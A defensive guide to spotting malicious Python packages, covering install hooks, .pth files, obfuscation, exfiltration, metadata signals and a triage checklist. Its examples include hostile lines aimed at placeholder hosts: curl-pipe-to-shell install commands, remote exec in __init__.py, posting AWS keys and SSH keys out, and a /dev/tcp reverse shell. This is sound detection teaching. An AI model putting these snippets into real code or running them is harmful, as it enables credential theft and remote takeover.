---
description: The red-flag taxonomy for malicious Python packages, with code, real incidents, and what detects each one.
---

# Red flags in a Python package

Ordered by confidence, most reliable first. Every entry is a *signal*, not a verdict, see
the corroboration rule on [Detection quality](detection-quality.md) before acting on any one
of them alone.

Name-based attacks (typosquatting, dependency confusion, starjacking, account takeover) have
their own page: [Name and distribution attacks](name-attacks.md).

## 1. Install-time code execution

The highest-severity surface, because it fires on `pip install` with no further user action
and before the package is even in `site-packages`.

### 1.1 `setup.py` command overwriting

```python
from setuptools import setup
from setuptools.command.install import install

class InstallCommand(install):
    def run(self):
        install.run(self)
        import subprocess
        subprocess.run("curl -s https://attacker.example/steal.sh | sh", shell=True)

setup(name="innocent-pkg", cmdclass={"install": InstallCommand})
```

**Red flags:** a `cmdclass` pointing at an unusual class name; a command class importing
`subprocess`, `socket`, `os`, or `ctypes`; logic split across `setup.py` and `setup.cfg`;
code at module scope rather than deferred into functions.

**Detects it:** GuardDog's `cmd-overwrite` rule; a Semgrep pattern for a custom install
command containing subprocess or network calls; by hand, `grep -r "cmdclass.*install"`.

**Real case:** a macOS-targeted package documented by Datadog Security Labs used a custom
`InstallCommand` to run XOR-encrypted payloads, keyed on a SHA3-512 hash of target file paths.

### 1.2 PEP 517 build hooks

```toml
[build-system]
# The backend must be importable in the isolated build env, so it has to be installed:
# an unknown distribution here is the actual red flag.
requires = ["setuptools", "wheel", "malicious-builder"]
build-backend = "malicious_builder.build"   # attacker-controlled module
```

```ini
# setup.cfg
[global]
command_packages = attacker_pkg
```

Build hooks run *before* the package is built, with full filesystem and network access.

Note what makes the example work. A PEP 517 backend is imported from the build environment, which
pip populates from `build-system.requires` (or from `backend-path` for an in-tree backend). Name a
backend you never declare and the build fails on import before any payload runs, so the
declaration is the tell: `build-backend` and `requires` have to agree, and it is the unrecognized
entry in `requires` that gives the attacker their code.

**Red flags:** a `build-backend` that isn't `setuptools`, `wheel`, or a well-known
third-party builder; an obscure single-use distribution in `build-system.requires`;
`backend-path` pointing into the source tree; `command_packages` or script paths in `setup.cfg`
sections like `egg_info`, `bdist_wheel`, `install_egg_info`.

**Detects it:** parse `pyproject.toml` and `setup.cfg`, compare `build-backend` against a
known-good list, and treat any distribution in `build-system.requires` that is not a recognized
build tool as a finding. No public scanner covers this today, so it is one you write yourself.

### 1.3 Module-level execution in `__init__.py`

```python
# package/__init__.py
import os, requests
response = requests.get(f"https://attacker.example/check?id={os.getenv('USER')}")
exec(response.text)
```

Python runs module-level code on `import`. Once installed, importing the package anywhere —
a test, a notebook cell, an editor's autocomplete, fires the payload.

**Red flags:** network calls, `exec`/`eval` of external data, subprocess calls, environment
or home-directory reads, or imports of `ctypes`/`marshal`/`zlib` at module scope rather than
inside a function.

{% hint style="info" %}
GuardDog historically concentrated its scanning on `setup.py` specifically to hold false
positives down, which means `__init__.py` and lazily imported submodules are the known
blind spot attackers aim at. Don't inherit that limitation.
{% endhint %}

### 1.4 `.pth` file auto-execution

A Python-specific gift to attackers. A `.pth` file in `site-packages` gets its
`import`-prefixed lines executed on **every interpreter start**, before any user code.

```
# site-packages/malicious_package.pth
import malicious_hook; malicious_hook.run()
```

A handful of legitimate packages ship one, and they are packages you almost certainly have
installed: setuptools ships `distutils-precedence.pth`, whose body runs code including an
`__import__` call; coverage and pytest-cov ship subprocess-hook `.pth` files; and every PEP 660
editable install (`pip install -e`) generates an `__editable__.<name>-<ver>.pth` that imports and
calls a finder. So the presence of a `.pth` is not the signal. What it contains is. A rule that
fires on "`.pth` exists" alerts on essentially every virtualenv, which is the fastest way to get
your detector switched off.

The March 2026 LiteLLM compromise shipped
`litellm_init.pth`, which decoded and executed base64-obfuscated credential-stealing code on
every Python startup, the mechanism that got that campaign named the "Hades" PyPI attack.

**Red flags:** a `.pth` shipped inside an sdist or wheel whose import line is not one of the
known-good cases above; obfuscated or encoded content in the body; a decode or exec call
(`base64`, `exec`, `eval`, network access); a `.pth` importing a module the package doesn't
contain; more than one `.pth` in a single package. A `.pth` named after the package is worth a
look, but only once the known-good names are excluded.

**Detects it:** audit the package structure before install; decode any base64 in the `.pth`;
post-install, diff `site-packages` for unexpected `.pth` files.

### 1.5 Executables shipped as data

```python
setup(
    name="innocent-pkg",
    data_files=[("scripts", ["hidden_payload.sh"])],
    include_package_data=True,
)
```

**Red flags:** `data_files` or `package_data` referencing `.sh`/`.py`/`.exe`; a custom
install command that chmods files; post-install hooks running external binaries; broad
`MANIFEST.in` patterns paired with `include_package_data=True`.

## 2. Obfuscation and anti-analysis

43.4% of malicious packages use some form of obfuscation ([ASE 2023](https://arxiv.org/abs/2309.11021)).

### 2.1 Decode-then-execute

```python
import base64
payload = base64.b64decode(b"aW1wb3J0IHNvY2tldDtpbXBvcnQgc3VicHJvY2Vzcw==")
exec(payload)
```

Decoders seen in the wild: `base64.b64decode` (most common), `base64.a85decode` /
`b85decode` (rarer, therefore more suspicious), `bytes.fromhex`, and hand-rolled decoding.
Execution sinks: `exec`, `eval`, `compile(...)` then `exec`, and
`importlib.import_module` with a computed name.

**Red flags:** `exec`/`eval` at module scope or in `__init__.py`; base64 blobs running to
100+ lines; nested encodings (`base64(hex(...))`); `exec` fed directly from a `requests`
response.

**Detects it:** GuardDog's `exec-base64` rule (Semgrep taint tracking). A minimal loadable
Semgrep rule, in taint mode so it catches the two-statement form above and not just a decode
written inline inside the `exec(...)` call:

```yaml
rules:
  - id: decode-then-exec
    message: Decoded or decompressed data reaches exec/eval
    languages: [python]
    severity: ERROR
    mode: taint
    pattern-sources:
      - pattern-either:
          - pattern: base64.b64decode(...)
          - pattern: base64.a85decode(...)
          - pattern: base64.b85decode(...)
          - pattern: bytes.fromhex(...)
          - pattern: zlib.decompress(...)
          - pattern: marshal.loads(...)
    pattern-sinks:
      - pattern-either:
          - pattern: exec(...)
          - pattern: eval(...)
```

Two things to keep straight if you adapt it: a rule file needs the top-level `rules:` list with
`id`, `message`, `languages`, and `severity`, or `semgrep -c` refuses to parse it; and a plain
`pattern: exec(...)` binds no metavariable, so a `metavariable-pattern` on the argument has nothing
to attach to. Taint mode is what makes `payload = b64decode(x)` followed by `exec(payload)` match.

**Real cases:** W4SP Stealer (2022, 45,000+ downloads of typosquatted packages);
BlazeStealer (2023, malware disguised as an obfuscation tool); NiroRAT (2025, polymorphic
XOR + zlib + marshal chains, 2/64 AV detection at disclosure).

### 2.2 Compression and bytecode pivots

```python
import zlib, marshal
compressed = b'x\x9c...'          # zlib-compressed marshal bytecode
exec(marshal.loads(zlib.decompress(compressed)))
```

`zlib.decompress`, `lzma.decompress`, `gzip.decompress`, `marshal.loads`, chained after XOR
or base64 to defeat string matching, since the magic bytes don't match a known pattern.

**Detects it:** grep or Semgrep for a decompressor or `marshal.loads` whose result reaches
`exec`/`eval`. That taint path is the reliable signal, because on disk the payload is compressed
or encoded and no byte signature survives.

Byte-level matching is weaker than it looks here, so don't lean on it. `marshal` output has **no
magic number at all**: it starts with a type-code byte (`0x63`, `c`, for a code object). The often-
quoted `0x03 0xf3` is the CPython **2.7 `.pyc`** header, which is version-specific and matches
nothing on a modern interpreter (Python 3.13 is `0x2b 0x0e`; read `importlib.util.MAGIC_NUMBER` for
the running version). YARA earns its place only on the *unwrapped* blob after decompression, and
even then match on structure rather than a fixed magic. `0x78 0x9c` is simply the default zlib
header and appears in countless benign binary assets, so it is not an alert on its own.

**Real case:** the LiteLLM payload ran base64 → AES-256-CBC → RSA-4096, decrypting only in
memory so nothing static ever hit disk. `aiocpa` (ReversingLabs, Nov 2024) used recursive
Base64(zlib(code)) inside the source file `utils/sync.py`, in the PyPI artifact only.

### 2.3 Dynamic dispatch

```python
module = __import__("sub" + "process")
func = getattr(module, "ca" + "ll")
func(["curl", "https://attacker.example/steal.sh"])
```

Splits dangerous names so static rules can't match them. Variants: `__import__` with
concatenation, `getattr` with a non-literal second argument, `importlib.__import__` on a
computed name, `eval("obj." + computed)`.

This is the published bypass of GuardDog's hardcoded patterns, researchers reconstructed
`builtins` via f-string chunks, `__import__(f'{a}{b}{c}')`, and the rules never fired.

**Detects it:** Semgrep pattern for `getattr` with a non-constant second argument; grep for
string concatenation adjacent to `__import__`, `getattr`, or `importlib.import_module`.

### 2.4 Unicode and homoglyphs

```python
suBprocess              # Cyrillic В (U+0412) standing in for Latin B: a distinct, valid identifier
payload = "sub​process"  # zero-width space (U+200B) inside a string, defeats naive grep
```

Note where each one is usable. Python applies NFKC to identifiers, and Cyrillic does not fold to
Latin, so the Cyrillic-B spelling stays a distinct identifier rather than colliding with the
all-Latin one: it reads as `subprocess` to a human and matches no rule looking for that literal
string. A zero-width space cannot appear in an identifier at all (U+200B is not in `XID_Continue`,
so it is a `SyntaxError`); it hides in string literals, comments, and package or display names,
where it breaks string matching.

**Red flags:** identifiers mixing Unicode scripts; combining diacriticals; odd encoding
declarations or BOMs; comments in an unexpected script.

**Detects it:** GuardDog's `unicode` rule; check for non-ASCII in identifiers; fold names to
a Unicode confusable skeleton (see [name attacks](name-attacks.md#homoglyph-skeletons)).

**Real case:** `onyxproxy` (Phylum) used Cyrillic and Greek lookalikes so name-matching rules
never fired.

### 2.5 Control-flow and layout obfuscation

```python
exec(eval(__import__('base64').b64decode('Zm9vYmFy').decode()))if True else None;x=1;y=2
```

**Red flags:** lines over 500–1,000 characters; minified Python; high entropy in a `.py`
file; unreachable code; conditional branches with no logical purpose; wildly uneven
complexity within one file.

## 3. Runtime behavior: what the payload does

### 3.1 Credential and secret exfiltration

The taint path that matters: a secret source reaching a network sink.

```python
import os, requests
requests.post("https://attacker.example", json={"key": os.getenv("AWS_ACCESS_KEY_ID")})
ssh_key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
```

| Filesystem sources | Environment sources |
|---|---|
| `~/.ssh/` (keys, `known_hosts`) | `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN` |
| `~/.aws/credentials`, `~/.azure/`, `~/.config/gcloud/` | `GITHUB_TOKEN`, `GH_TOKEN` |
| `~/.kube/config`, `/var/run/secrets/kubernetes.io/` | `SLACK_BOT_TOKEN`, `SLACK_WEBHOOK_URL`, `DISCORD_WEBHOOK_URL` |
| `~/.gitconfig`, `~/.git-credentials` | `OPENAI_API_KEY`, `ANTHROPIC_API_KEY` |
| `.env`, `.env.local`; browser profile and cookie dirs | `STRIPE_SECRET_KEY`, `DATABASE_URL` |
| `/etc/passwd`, `/proc/`, EC2 IMDS at `169.254.169.254` | |

**Detects it:** GuardDog's `exfiltrate-sensitive-data` rule; Semgrep taint tracking from
credential paths or `os.getenv` to a network call; grep for `expanduser`/`os.environ`
co-occurring with `requests`/`urllib`/`socket`.

**Real case:** the LiteLLM payload harvested every `.env` variant, `~/.aws/credentials`,
Kubernetes secrets, Vault tokens, AWS SSM Parameter Store values (via SigV4-signed API
calls), and Slack/Discord webhooks, then posted them encrypted to
`https://models.litellm[.]cloud/`.

### 3.2 Suspicious network destinations

**Red flags:** raw IPs, especially non-RFC1918; Pastebin, Discord webhooks, or Telegram as
dead-drops; newly registered domains and throwaway TLDs (`.xyz`, `.top`); URL shorteners;
hardcoded endpoints whose naming gives the game away. GuardDog covers part of this with
`shady-links`.

### 3.3 Subprocess and OS command execution

```python
# POSIX: output suppressed so nothing shows in build logs
subprocess.Popen(["curl", "-s", "https://attacker.example/backdoor.sh"],
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
os.system("wget https://attacker.example/m && chmod +x m && ./m")

# Windows: the flag only exists on Windows builds of subprocess
if os.name == "nt":
    subprocess.Popen(["powershell", "-c", "..."],
                     creationflags=subprocess.CREATE_NO_WINDOW)
```

**Red flags:** any of this at module scope; `shell=True`; arguments containing URLs; output
redirected to `DEVNULL`; `CREATE_NO_WINDOW`; command strings assembled from environment
variables or network responses.

**Detects it:** GuardDog's `code-execution` and `silent-process-execution` rules; YARA on
subprocess + `DEVNULL` or subprocess + `CREATE_NO_WINDOW`.

### 3.4 `ctypes` and low-level access

```python
libc = ctypes.CDLL("libc.so.6" if os.name == "posix" else "msvcrt")
libc.system(b"/bin/bash -i >& /dev/tcp/attacker.example/4444 0>&1")
```

Bypasses subprocess detection entirely and can reach privilege escalation, raw syscalls, or
undocumented APIs. Legitimate use outside well-known FFI bindings is rare enough that any
`ctypes.CDLL`/`ctypes.windll` deserves a read.

### 3.5 Cryptominers

```python
for _ in range(multiprocessing.cpu_count()):
    threading.Thread(target=mine, daemon=True).start()
```

**Red flags:** hashing or crypto in tight loops; threads spawned across `cpu_count()`; GPU
access via `cupy`/`pycuda`; `stratum+tcp://` or pool names in config or env. GuardDog has a
`cryptominer` rule. Cheapest reliable detection is runtime: sustained CPU after import.

### 3.6 Other capability signals

GuardDog also carries rules for `clipboard-access`, `screenshot`, `dll-hijacking`,
`download-executable`, `steganography`, and `pyarmor` (commercial obfuscator use). Each is a
capability; per its own design philosophy, a capability only matters alongside a threat
indicator in the same file.

## 4. Metadata and publishing signals

Individually weak, collectively useful, and cheap enough to run on everything.

**Newness.** Package created within days; a single release; all releases inside one short
window; maintainer account under 1–3 months old with no other packages and no prior publish
history. MalGuard flagged 144 suspicious packages in five weeks in early 2025, many from
newly created accounts. Q2 2025 data from FortiGuard found most malicious packages were
first releases with under 100 downloads.

**Absence of the usual.** Under ~100 downloads total; no `project_urls` or `home_page`; a
repo link that 404s; a repo created *after* the PyPI package; no commit history matching
release dates.

**Metadata anomalies.** Version `0.0.0`, `99.99.99`, or an erratic jump like 1.0 → 1.0.1 →
10.0; empty or placeholder `summary`; author "Admin"/"User"/"Test"; missing classifiers;
package name never mentioned in the description or README.

**Manifest confusion (the sdist/wheel gap).** PyPI shows one thing, the wheel installs
another. Users read the source on the project page; `pip` installs the binary.

* Compare the file list in the sdist against the wheel.
* Compare `METADATA` (wheel) against `PKG-INFO` (sdist), and `Requires` against `install_requires`.
* Hash equivalent files and expect them to match.

This is the [`stiankri` manifest-confusion](https://stiankri.substack.com/p/manifest-confusion-in-pypi)
finding, and it is still mostly checked by hand, no public tool audits it at PyPI scale.

## 5. Persistence and anti-analysis

Almost never benign, but never sufficient alone, they tell you the author expected to be
analyzed.

**Delayed execution.** `time.sleep(3600)` before anything interesting, or
`if sys.gettrace() is None:` guards. Automated sandboxes run for 30 seconds to five minutes;
sleeping past that is free evasion.

**Sandbox and VM detection.**

```python
def is_sandboxed():
    out = subprocess.check_output(["dmidecode"]).decode()
    return any(v in out for v in ("VirtualBox", "VMware", "QEMU", "Xen", "Hyper-V"))

if not is_sandboxed():
    run_payload()
```

Also: `/proc/cpuinfo` reads, container environment variables, `platform.system()` checks.

**Geofencing and targeting.** IP geolocation via a lookup service, `socket.gethostname()` or
`getpass.getuser()` comparisons, device fingerprinting. Researchers outside the target
region run the code and see nothing. The macOS campaign Datadog documented hashed target
file paths with SHA3-512 to confirm it was on the intended machine.

**C2 availability check.** Ping the C2 first; behave benignly if it's unreachable, which is
exactly what a sandbox with no egress looks like.

**String encryption.** Long hex or base64 constants with no visible purpose; XOR loops; AES
routines used for something other than the package's stated job.

## Banded checklist

These bands rank **confidence**, which is a different axis from the numbered signal *tiers* in the
[scoring scheme](detection-quality.md#signal-tiers). Don't mix the two vocabularies: collecting
several Band A hits does not satisfy that scheme's "two different tiers" requirement, because Band
A deliberately spans scheme Tier 1 (install-time execution, weight 5) and scheme Tier 3 (network
and credential access, weight 3). Score with the tiers; triage with the bands.

**Band A, highest confidence, lowest FP rate** (mostly scheme Tier 1 and Tier 3)

* [ ] `exec`/`eval` fed by base64, zlib, marshal, or hex
* [ ] Custom install command running subprocess or network calls
* [ ] A `.pth` in an sdist or wheel whose import line is not on the known-good list
      (setuptools, coverage, `__editable__.*`) and whose body decodes or executes data
* [ ] Non-standard `build-backend`, or an unrecognized distribution in `build-system.requires`
* [ ] Module-level network request to a suspicious domain or raw IP
* [ ] Levenshtein distance 1 to a top-5,000 package, or distance 2 with both edits
      keyboard-adjacent
* [ ] Credential source (`~/.ssh`, `~/.aws`, `AWS_*`) reaching a network sink

**Band B, medium confidence, some FPs in data-science packages** (mostly scheme Tier 2 and Tier 4)

* [ ] `ctypes` with system library names
* [ ] `shell=True`, `DEVNULL`, or `CREATE_NO_WINDOW`
* [ ] Sensitive file reads in `__init__.py`
* [ ] Multi-layer obfuscation (base64 + zlib + exec)
* [ ] Created <7 days ago with a single release
* [ ] Under ~50 total downloads
* [ ] Missing or broken repository link
* [ ] sdist/wheel file-count mismatch

**Band C, needs review or more context** (mostly scheme Tier 4 and Tier 5)

* [ ] `getattr`/`importlib` with concatenated names
* [ ] Lines >500 chars, or high-entropy source
* [ ] Sleep before suspicious operations
* [ ] Sandbox or VM detection
* [ ] Maintainer account under 3 months old
* [ ] Version anomalies (`0.0.0`, `99.99.99`)
* [ ] Levenshtein distance 2 to a top-5,000 package without keyboard adjacency, which sweeps in
      ordinary neighbours like `urllib`/`urllib3`
* [ ] A `.pth` present at all, once the known-good names are excluded

## Patterns that look malicious and aren't

The reason the corroboration rule exists. All of the following are ordinary:

* **`base64` + `pickle`** for serialization, ML model serving, Flask sessions, caches.
* **`exec` in `setup.py`** for C-extension builds, numpy, cryptography, anything
  Cython-generated. Allowlist when `from Cython.Build import cythonize` (or equivalent) is present.
* **Cloud SDKs reading credential paths**: boto3, google-cloud-python, azure-identity. That
  is their entire job.
* **Dynamic imports in plugin systems**: pytest, Flask extensions, anything with an entry-point registry.
* **Runtime code compilation** in templating engines, Jinja2, Mako.
* **`zlib`/`brotli` decompression** of embedded resources, fonts, prebuilt binaries, test fixtures.
* **Unusual version numbers** and deliberately obfuscated build scripts in projects with a
  commercial fork.

The distinguishing features of benign use: the taint chain starts from a declared source
(a static data file, a config value) rather than the network; there is no corroborating
signal (no exfil path, no install hook running outside build); and the package has a
popularity and history prior that a two-day-old upload does not.

## Sources

* [Finding malicious PyPI packages through static code analysis (GuardDog)](https://securitylabs.datadoghq.com/articles/guarddog-identify-malicious-pypi-packages/), Datadog Security Labs
* [GuardDog 2.0: YARA scanning, user-supplied rules, Golang support](https://securitylabs.datadoghq.com/articles/guarddog-2-0-release/), Datadog Security Labs
* [Malicious PyPI packages targeting highly specific macOS machines](https://securitylabs.datadoghq.com/articles/malicious-pypi-package-targeting-highly-specific-macos-machines/), Datadog Security Labs
* [How we evaded Datadog's malicious package detection](https://medium.com/@heyyoad/how-we-evaded-datadogs-malicious-package-detection-lessons-for-better-security-e8c9b185f97e), the `__import__` f-string bypass
* [LiteLLM backdoored by TeamPCP](https://www.sonatype.com/blog/compromised-litellm-pypi-package-delivers-multi-stage-credential-stealer), Sonatype
* [Massive PyPI supply chain attack: cloud credentials via Python startup hooks](https://orca.security/resources/blog/hades-pypi-supply-chain-attack/), Orca Security (the `.pth` mechanism)
* [Python info-stealing malware uses Unicode to evade detection](https://www.bleepingcomputer.com/news/security/python-info-stealing-malware-uses-unicode-to-evade-detection/), BleepingComputer on `onyxproxy`
* [Malicious PyPI crypto-pay package aiocpa implants infostealer code](https://www.reversinglabs.com/blog/malicious-pypi-crypto-pay-package-aiocpa-implants-infostealer-code), ReversingLabs
* [Manifest confusion in PyPI](https://stiankri.substack.com/p/manifest-confusion-in-pypi), stiankri
* [Decode Python exec obfuscation: base64, compression, lambda chains](https://klaroskope.com/learn/decode-python-exec-obfuscation), KlaroSkope
* [Top 8 malicious attacks recently found on PyPI](https://www.sonatype.com/blog/top-8-malicious-attacks-recently-found-on-pypi), Sonatype
* [PyPI malware stealing Discord and Roblox credentials](https://labs.snyk.io/resources/pypi-malware-discord-roblox-credential-payment-info/), Snyk Labs
* [Unveiling malicious logic: a statement-level taxonomy for securing Python packages](https://arxiv.org/html/2512.12559v1), arXiv:2512.12559, the 47-indicator taxonomy
* [MalGuard: real-time, accurate, actionable malicious package detection](https://arxiv.org/pdf/2506.14466), arXiv:2506.14466
